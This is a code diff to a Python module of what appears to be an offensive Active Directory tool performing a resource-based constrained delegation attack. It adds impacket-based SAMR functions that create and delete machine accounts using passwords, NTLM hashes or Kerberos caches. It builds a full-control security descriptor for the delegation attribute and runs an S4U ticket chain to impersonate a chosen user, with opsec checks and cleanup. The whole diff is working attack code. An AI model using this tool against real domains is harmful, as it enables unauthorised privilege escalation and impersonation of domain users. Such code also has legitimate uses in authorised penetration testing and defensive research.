@@ -10,6 +10,7 @@ from dataclasses import dataclass, field
 from typing import Optional
 
 from impacket.ldap import ldaptypes
+from impacket.dcerpc.v5 import samr, transport
 
 from core.auth import AuthContext, AuthMethod, auth_password
 from core.ldap import LDAPConnection, OpsecConfig, connect
@@ -42,39 +43,161 @@ class RBCDConfig:
 
 
 def _build_rbcd_security_descriptor(account_sid: str) -> bytes:
-    """
-    Build a security descriptor granting full control to account_sid,
-    suitable for writing to msDS-AllowedToActOnBehalfOfOtherIdentity.
-    Uses impacket.ldap.ldaptypes matching ldapattack.py reference.
-    """
     nace = ldaptypes.ACE()
     nace["AceType"]  = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
     nace["AceFlags"] = 0x00
-
     acedata = ldaptypes.ACCESS_ALLOWED_ACE()
     acedata["Mask"] = ldaptypes.ACCESS_MASK()
-    acedata["Mask"]["Mask"] = 983551  # Full control
+    acedata["Mask"]["Mask"] = 983551
     acedata["Sid"]  = ldaptypes.LDAP_SID()
     acedata["Sid"].fromCanonical(account_sid)
     nace["Ace"] = acedata
-
     acl = ldaptypes.ACL()
     acl["AclRevision"] = 4
     acl["Sbz1"]        = 0
     acl["Sbz2"]        = 0
     acl.aces = [nace]
-
     sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
-    sd["Revision"] = b"\x01"
-    sd["Sbz1"]     = b"\x00"
+    sd["Revision"] = bytes([0x01])
+    sd["Sbz1"]     = bytes([0x00])
     sd["Control"]  = 32772
     sd["OwnerSid"] = ldaptypes.LDAP_SID()
     sd["OwnerSid"].fromCanonical("S-1-5-32-544")
     sd["GroupSid"] = b""
     sd["Sacl"]     = b""
     sd["Dacl"]     = acl
-
     return sd.getData()
+
+
+def _create_machine_account_samr(dc_ip, domain, auth, name, password):
+    sam_name       = name.rstrip("$") + "$"
+    domain_upper   = domain.upper()
+    domain_netbios = domain.split(".")[0].upper()
+    string_binding = r"ncacn_np:" + dc_ip + r"[\pipe\samr]"
+
+    try:
+        rpctransport = transport.DCERPCTransportFactory(string_binding)
+        rpctransport.set_dport(445)
+        if auth.auth_method == AuthMethod.PASSWORD:
+            rpctransport.set_credentials(auth.username, auth.password, domain_upper, "", "", None)
+        elif auth.auth_method == AuthMethod.HASH:
+            import binascii
+            rpctransport.set_credentials(
+                auth.username, "", domain_upper,
+                binascii.unhexlify(auth.lm_hash),
+                binascii.unhexlify(auth.nt_hash), None)
+        elif auth.auth_method == AuthMethod.CCACHE:
+            import os
+            os.environ["KRB5CCNAME"] = auth.ccache_path
+            rpctransport.set_kerberos(True, kdcHost=dc_ip)
+            rpctransport.set_credentials(auth.username, "", domain_upper)
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+        dce.bind(samr.MSRPC_UUID_SAMR)
+    except Exception as e:
+        error(f"SAMR connection failed: {e}")
+        return None
+
+    serv_handle = domain_handle = user_handle = None
+    try:
+        cr          = samr.hSamrConnect5(dce, "\\\\" + dc_ip + "\x00",
+                          samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN)
+        serv_handle = cr["ServerHandle"]
+        er          = samr.hSamrEnumerateDomainsInSamServer(dce, serv_handle)
+        domains     = [d for d in er["Buffer"]["Buffer"] if d["Name"].lower() != "builtin"]
+        matching    = [d for d in domains if d["Name"].lower() == domain_netbios.lower()]
+        selected    = matching[0]["Name"] if matching else domains[0]["Name"]
+        lr          = samr.hSamrLookupDomainInSamServer(dce, serv_handle, selected)
+        odr         = samr.hSamrOpenDomain(dce, serv_handle,
+                          samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER, lr["DomainId"])
+        domain_handle = odr["DomainHandle"]
+
+        try:
+            samr.hSamrLookupNamesInDomain(dce, domain_handle, [sam_name])
+            error(f"Machine account {sam_name} already exists.")
+            return None
+        except samr.DCERPCSessionError as e:
+            if e.error_code != 0xc0000073:
+                raise
+
+        cr2         = samr.hSamrCreateUser2InDomain(dce, domain_handle, sam_name,
+                          samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE)
+        user_handle = cr2["UserHandle"]
+        samr.hSamrSetPasswordInternal4New(dce, user_handle, password)
+
+        l2   = samr.hSamrLookupNamesInDomain(dce, domain_handle, [sam_name])
+        rid  = l2["RelativeIds"]["Element"][0]
+        ou   = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, rid)
+        uh2  = ou["UserHandle"]
+        req  = samr.SAMPR_USER_INFO_BUFFER()
+        req["tag"] = samr.USER_INFORMATION_CLASS.UserControlInformation
+        req["Control"]["UserAccountControl"] = samr.USER_WORKSTATION_TRUST_ACCOUNT
+        samr.hSamrSetInformationUser2(dce, uh2, req)
+        samr.hSamrCloseHandle(dce, uh2)
+
+        success(f"Created machine account via SAMR: {sam_name}")
+        return sam_name
+
+    except samr.DCERPCSessionError as e:
+        error(f"SAMR error: {e}")
+        return None
+    except Exception as e:
+        error(f"Machine account creation failed: {e}")
+        return None
+    finally:
+        for h in [user_handle, domain_handle, serv_handle]:
+            if h is not None:
+                try:
+                    samr.hSamrCloseHandle(dce, h)
+                except Exception:
+                    pass
+        try:
+            dce.disconnect()
+        except Exception:
+            pass
+
+
+def _delete_machine_account_samr(dc_ip, domain, auth, sam_name):
+    domain_upper   = domain.upper()
+    domain_netbios = domain.split(".")[0].upper()
+    string_binding = r"ncacn_np:" + dc_ip + r"[\pipe\samr]"
+    try:
+        rpctransport = transport.DCERPCTransportFactory(string_binding)
+        rpctransport.set_dport(445)
+        if auth.auth_method == AuthMethod.PASSWORD:
+            rpctransport.set_credentials(auth.username, auth.password, domain_upper)
+        elif auth.auth_method == AuthMethod.HASH:
+            import binascii
+            rpctransport.set_credentials(auth.username, "", domain_upper,
+                binascii.unhexlify(auth.lm_hash), binascii.unhexlify(auth.nt_hash), None)
+        elif auth.auth_method == AuthMethod.CCACHE:
+            import os
+            os.environ["KRB5CCNAME"] = auth.ccache_path
+            rpctransport.set_kerberos(True, kdcHost=dc_ip)
+            rpctransport.set_credentials(auth.username, "", domain_upper)
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+        dce.bind(samr.MSRPC_UUID_SAMR)
+        cr      = samr.hSamrConnect5(dce, "\\\\" + dc_ip + "\x00",
+                      samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN)
+        sh      = cr["ServerHandle"]
+        er      = samr.hSamrEnumerateDomainsInSamServer(dce, sh)
+        doms    = [d for d in er["Buffer"]["Buffer"] if d["Name"].lower() != "builtin"]
+        match   = [d for d in doms if d["Name"].lower() == domain_netbios.lower()]
+        sel     = match[0]["Name"] if match else doms[0]["Name"]
+        lr      = samr.hSamrLookupDomainInSamServer(dce, sh, sel)
+        odr     = samr.hSamrOpenDomain(dce, sh, samr.DOMAIN_LOOKUP, lr["DomainId"])
+        dh      = odr["DomainHandle"]
+        l2      = samr.hSamrLookupNamesInDomain(dce, dh, [sam_name])
+        rid     = l2["RelativeIds"]["Element"][0]
+        ou      = samr.hSamrOpenUser(dce, dh, samr.DELETE, rid)
+        samr.hSamrDeleteUser(dce, ou["UserHandle"])
+        dce.disconnect()
+        success(f"Deleted machine account: {sam_name}")
+        return True
+    except Exception as e:
+        warning(f"Failed to delete {sam_name}: {e}")
+        return False
 
 
 def _verify_write_access(ldap_conn, target, auth):
@@ -104,45 +227,6 @@ def _get_delegate_account_sid(ldap_conn, delegate_account):
     return sid
 
 
-def _encode_password(password: str) -> bytes:
-    return f'"{password}"'.encode("utf-16-le")
-
-
-def _create_machine_account(ldap_conn, name, password, domain):
-    import ldap3
-    sam_name = name.rstrip("$") + "$"
-    dn       = f"CN={name.rstrip('$')},CN=Computers,{ldap_conn.base_dn}"
-    dns_name = f"{name.rstrip('$').lower()}.{domain.lower()}"
-
-    try:
-        ldap_conn._conn.add(
-            dn,
-            attributes={
-                "objectClass":          ["top", "person", "organizationalPerson",
-                                         "user", "computer"],
-                "sAMAccountName":       sam_name,
-                "userAccountControl":   "4096",
-                "dNSHostName":          dns_name,
-                "servicePrincipalName": [
-                    f"HOST/{dns_name}",
-                    f"RestrictedKrbHost/{dns_name}",
-                ],
-                "unicodePwd":           _encode_password(password),
-            },
-        )
-    except Exception as e:
-        error(f"Failed to create machine account '{sam_name}': {e}")
-        return None
-
-    if ldap_conn._conn.result["result"] != 0:
-        desc = ldap_conn._conn.result.get("description", "unknown")
-        error(f"Machine account creation failed: {desc}")
-        return None
-
-    success(f"Created machine account: {sam_name}")
-    return sam_name
-
-
 def _delete_machine_account(ldap_conn, sam_name):
     results = ldap_conn._query(f"(sAMAccountName={sam_name})", ["distinguishedName"])
     if not results:
@@ -160,7 +244,7 @@ def _delete_machine_account(ldap_conn, sam_name):
     return False
 
 
-def _cleanup(ldap_conn, target_dn, machine_sam):
+def _cleanup(ldap_conn, target_dn, machine_sam, dc_ip=None, domain=None, auth=None):
     info("Cleaning up RBCD configuration...")
     cleared = ldap_conn.clear_rbcd(target_dn)
     if cleared:
@@ -168,16 +252,21 @@ def _cleanup(ldap_conn, target_dn, machine_sam):
     else:
         warning("Failed to remove RBCD attribute — manual cleanup may be required")
     if machine_sam:
-        _delete_machine_account(ldap_conn, machine_sam)
+        if dc_ip and auth:
+            _delete_machine_account_samr(dc_ip, domain or ldap_conn.domain, auth, machine_sam)
+        else:
+            _delete_machine_account(ldap_conn, machine_sam)
 
 
 def _random_suffix(length=6):
-    import random, string
+    import random
+    import string
     return "".join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
 
 def _random_password(length=20):
-    import random, string
+    import random
+    import string
     chars = string.ascii_letters + string.digits + "!@#$%^&*()"
     return "".join(random.choices(chars, k=length))
 
@@ -198,11 +287,8 @@ def run_rbcd(auth: AuthContext, config: RBCDConfig) -> Optional[TicketResult]:
     info("Connecting to LDAP...")
     try:
         ldap_conn = connect(
-            auth=auth,
-            dc_ip=config.dc_ip,
-            domain=config.domain,
-            opsec=ldap_opsec,
-            use_ssl=config.use_ssl,
+            auth=auth, dc_ip=config.dc_ip, domain=config.domain,
+            opsec=ldap_opsec, use_ssl=config.use_ssl,
         )
     except SystemExit:
         raise
@@ -227,8 +313,10 @@ def run_rbcd(auth: AuthContext, config: RBCDConfig) -> Optional[TicketResult]:
             return None
         comp_name = config.new_computer_name or f"DELEGATOR-{_random_suffix()}"
         comp_pass = config.new_computer_pass or _random_password()
-        info(f"Creating machine account: {comp_name}$")
-        delegate_sam = _create_machine_account(ldap_conn, comp_name, comp_pass, config.domain)
+        info(f"Creating machine account via SAMR: {comp_name}$")
+        delegate_sam = _create_machine_account_samr(
+            config.dc_ip, config.domain, auth, comp_name, comp_pass
+        )
         if not delegate_sam:
             return None
         delegate_pass   = comp_pass
@@ -250,13 +338,13 @@ def run_rbcd(auth: AuthContext, config: RBCDConfig) -> Optional[TicketResult]:
     delegate_sid = _get_delegate_account_sid(ldap_conn, delegate_sam)
     if not delegate_sid:
         if created_account:
-            _delete_machine_account(ldap_conn, delegate_sam)
+            _delete_machine_account_samr(config.dc_ip, config.domain, auth, delegate_sam)
         return None
     info(f"Delegation account SID: {delegate_sid}")
 
     if not opsec.check("rbcd_write"):
         if created_account:
-            _delete_machine_account(ldap_conn, delegate_sam)
+            _delete_machine_account_samr(config.dc_ip, config.domain, auth, delegate_sam)
         return None
 
     info(f"Writing RBCD attribute to {config.target}...")
@@ -266,7 +354,7 @@ def run_rbcd(auth: AuthContext, config: RBCDConfig) -> Optional[TicketResult]:
     write_ok = ldap_conn.write_rbcd(target_dn, sd_bytes)
     if not write_ok:
         if created_account:
-            _delete_machine_account(ldap_conn, delegate_sam)
+            _delete_machine_account_samr(config.dc_ip, config.domain, auth, delegate_sam)
         return None
 
     success(f"RBCD configured: {delegate_sam} can now delegate to {config.target}")
@@ -290,27 +378,31 @@ def run_rbcd(auth: AuthContext, config: RBCDConfig) -> Optional[TicketResult]:
 
     try:
         ticket_result = full_s4u_chain(
-            auth=delegate_auth,
-            dc_ip=config.dc_ip,
+            auth=delegate_auth, dc_ip=config.dc_ip,
             impersonate=config.impersonate,
-            service_spn=delegate_spn,
-            target_spn=target_spn,
+            service_spn=delegate_spn, target_spn=target_spn,
             output_dir=config.output_dir,
         )
     except SystemExit:
         if config.cleanup:
-            _cleanup(ldap_conn, target_dn, delegate_sam if created_account else None)
+            _cleanup(ldap_conn, target_dn,
+                     delegate_sam if created_account else None,
+                     dc_ip=config.dc_ip, domain=config.domain, auth=auth)
         raise
     except Exception as e:
         error(f"S4U chain failed: {e}")
         if config.cleanup:
-            _cleanup(ldap_conn, target_dn, delegate_sam if created_account else None)
+            _cleanup(ldap_conn, target_dn,
+                     delegate_sam if created_account else None,
+                     dc_ip=config.dc_ip, domain=config.domain, auth=auth)
         return None
 
     success("S4U chain completed successfully")
 
     if config.cleanup:
-        _cleanup(ldap_conn, target_dn, delegate_sam if created_account else None)
+        _cleanup(ldap_conn, target_dn,
+                 delegate_sam if created_account else None,
+                 dc_ip=config.dc_ip, domain=config.domain, auth=auth)
 
     ldap_conn.close()
 
